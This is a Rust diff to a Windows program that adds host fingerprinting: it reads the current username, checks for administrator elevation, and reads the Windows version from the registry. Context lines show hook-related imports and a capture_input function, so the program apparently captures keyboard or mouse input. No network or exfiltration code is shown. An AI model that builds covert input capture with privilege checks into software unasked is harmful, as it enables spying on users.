@@ -1,12 +1,17 @@
 use std::ptr;
-use winapi::shared::windef::HHOOK;
-use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
-use winapi::um::sysinfoapi::{GetSystemInfo, GetVersionExW, SYSTEM_INFO};
-use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
-use winapi::um::winnt::OSVERSIONINFOW;
 use std::mem;
-use winapi::um::winuser::GetCursorPos;
-use winapi::shared::windef::POINT;
+use std::ffi::OsString;
+use std::os::windows::ffi::OsStringExt;
+use winapi::shared::windef::{HHOOK, POINT};
+use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM, DWORD, HKEY};
+use winapi::um::sysinfoapi::{GetSystemInfo, GetVersionExW, SYSTEM_INFO};
+use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN, GetCursorPos};
+use winapi::um::winnt::{OSVERSIONINFOW, OSVERSIONINFOEXW, VER_NT_WORKSTATION, TOKEN_QUERY, TokenElevation, TOKEN_ELEVATION, REG_SZ, KEY_READ};
+use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
+use winapi::um::securitybaseapi::GetTokenInformation;
+use winapi::um::handleapi::CloseHandle;
+use winapi::um::winbase::GetUserNameW;
+use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE};
 
 
 use winapi::um::winuser::{
@@ -118,16 +123,43 @@ fn get_basic_info() -> Result<(), Box<dyn std::error::Error>> {
         os_info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOW>() as u32;
         GetVersionExW(&mut os_info);
         
+        // Obtener nombre de usuario
+        let mut username_buffer = [0u16; 256];
+        let mut username_size = username_buffer.len() as DWORD;
+        let username = if GetUserNameW(username_buffer.as_mut_ptr(), &mut username_size) != 0 {
+            let username_slice = &username_buffer[..username_size.saturating_sub(1) as usize];
+            OsString::from_wide(username_slice).to_string_lossy().to_string()
+        } else {
+            "Unknown".to_string()
+        };
+        
+        // Verificar si tiene privilegios de administrador
+        let mut token_handle = ptr::null_mut();
+        let mut is_admin = false;
+        
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) != 0 {
+            let mut elevation: TOKEN_ELEVATION = mem::zeroed();
+            let mut return_length: DWORD = 0;
+            
+            if GetTokenInformation(
+                token_handle,
+                TokenElevation,
+                &mut elevation as *mut TOKEN_ELEVATION as *mut winapi::ctypes::c_void,
+                mem::size_of::<TOKEN_ELEVATION>() as DWORD,
+                &mut return_length,
+            ) != 0 {
+                is_admin = elevation.TokenIsElevated != 0;
+            }
+            
+            CloseHandle(token_handle);
+        }
+        
         println!("=== SYSTEM INFORMATION ===");
+        println!("Current User: {}", username);
+        println!("Admin Privileges: {}", if is_admin { "YES" } else { "NO" });
         println!("Screen Resolution: {}x{}", screen_width, screen_height);
-        println!("Processor Architecture: {}", system_info.u.s().wProcessorArchitecture);
-        println!("Number of Processors: {}", system_info.dwNumberOfProcessors);
-        println!("Page Size: {} bytes", system_info.dwPageSize);
-        println!("OS Version: {}.{}.{}", 
-                os_info.dwMajorVersion, 
-                os_info.dwMinorVersion, 
-                os_info.dwBuildNumber);
-        println!("=============================");
+        println!("OS Version: {}", get_windows_version());
+        println!("Architecture: {}", get_system_architecture());
     }
     
     Ok(())
@@ -362,4 +394,153 @@ fn capture_input() -> Result<(), Box<dyn std::error::Error>> {
     }
     
     Ok(())
+}
+
+
+fn get_windows_version() -> String {
+    // Método 1: Intentar leer desde el registro (más confiable)
+    if let Some(version) = get_version_from_registry() {
+        return version;
+    }
+    
+    // Método 2: Usar GetVersionEx como fallback
+    get_version_from_api()
+}
+
+fn get_version_from_registry() -> Option<String> {
+    unsafe {
+        let mut hkey: HKEY = std::ptr::null_mut();
+        let key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect::<Vec<u16>>();
+        
+        // Abrir la clave del registro
+        if RegOpenKeyExW(
+            HKEY_LOCAL_MACHINE,
+            key_path.as_ptr(),
+            0,
+            KEY_READ,
+            &mut hkey,
+        ) != 0 {
+            return None;
+        }
+        
+        // Leer ProductName
+        let product_name = read_registry_string(hkey, "ProductName")?;
+        
+        // Leer CurrentBuildNumber
+        let build_number = read_registry_string(hkey, "CurrentBuildNumber")?;
+        
+        // Leer DisplayVersion (Windows 10/11) o ReleaseId como fallback
+        let display_version = read_registry_string(hkey, "DisplayVersion")
+            .or_else(|| read_registry_string(hkey, "ReleaseId"));
+        
+        RegCloseKey(hkey);
+        
+        // Construir la cadena de versión
+        let mut version = product_name;
+        if let Some(display_ver) = display_version {
+            version.push_str(&format!(" (Version {})", display_ver));
+        }
+        version.push_str(&format!(" Build {}", build_number));
+        
+        Some(version)
+    }
+}
+
+fn read_registry_string(hkey: HKEY, value_name: &str) -> Option<String> {
+    unsafe {
+        let value_name_wide: Vec<u16> = value_name
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+        
+        let mut data_type: DWORD = 0;
+        let mut data_size: DWORD = 0;
+        
+        // Primero obtener el tamaño
+        if RegQueryValueExW(
+            hkey,
+            value_name_wide.as_ptr(),
+            std::ptr::null_mut(),
+            &mut data_type,
+            std::ptr::null_mut(),
+            &mut data_size,
+        ) != 0 || data_type != REG_SZ {
+            return None;
+        }
+        
+        // Leer el valor
+        let mut buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
+        if RegQueryValueExW(
+            hkey,
+            value_name_wide.as_ptr(),
+            std::ptr::null_mut(),
+            &mut data_type,
+            buffer.as_mut_ptr() as *mut u8,
+            &mut data_size,
+        ) != 0 {
+            return None;
+        }
+        
+        // Convertir a String
+        let os_string = OsString::from_wide(&buffer[..buffer.len().saturating_sub(1)]);
+        os_string.into_string().ok()
+    }
+}
+
+fn get_version_from_api() -> String {
+    unsafe {
+        let mut os_info: OSVERSIONINFOEXW = std::mem::zeroed();
+        os_info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOEXW>() as u32;
+        
+        if GetVersionExW(&mut os_info as *mut _ as *mut _) == 0 {
+            return "Unknown Windows Version".to_string();
+        }
+        
+        let windows_version = match (os_info.dwMajorVersion, os_info.dwMinorVersion) {
+            (10, 0) => {
+                // Para Windows 10/11, necesitamos el build number
+                if os_info.dwBuildNumber >= 22000 {
+                    "Windows 11"
+                } else {
+                    "Windows 10"
+                }
+            },
+            (6, 3) => "Windows 8.1",
+            (6, 2) => "Windows 8",
+            (6, 1) => "Windows 7",
+            (6, 0) => "Windows Vista",
+            (5, 2) => {
+                // Distinguir entre XP 64-bit y Server 2003
+                if os_info.wProductType == VER_NT_WORKSTATION {
+                    "Windows XP 64-bit"
+                } else {
+                    "Windows Server 2003"
+                }
+            },
+            (5, 1) => "Windows XP",
+            (5, 0) => "Windows 2000",
+            _ => "Unknown Windows Version",
+        };
+        
+        format!("{} (Build {})", windows_version, os_info.dwBuildNumber)
+    }
+}
+
+// Función adicional para obtener información de arquitectura
+fn get_system_architecture() -> String {
+    unsafe {
+        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
+        GetSystemInfo(&mut sys_info);
+        
+        match sys_info.u.s().wProcessorArchitecture {
+            9 => "x64".to_string(),      // PROCESSOR_ARCHITECTURE_AMD64
+            5 => "ARM".to_string(),      // PROCESSOR_ARCHITECTURE_ARM
+            12 => "ARM64".to_string(),   // PROCESSOR_ARCHITECTURE_ARM64
+            0 => "x86".to_string(),      // PROCESSOR_ARCHITECTURE_INTEL
+            _ => "Unknown".to_string(),
+        }
+    }
 }
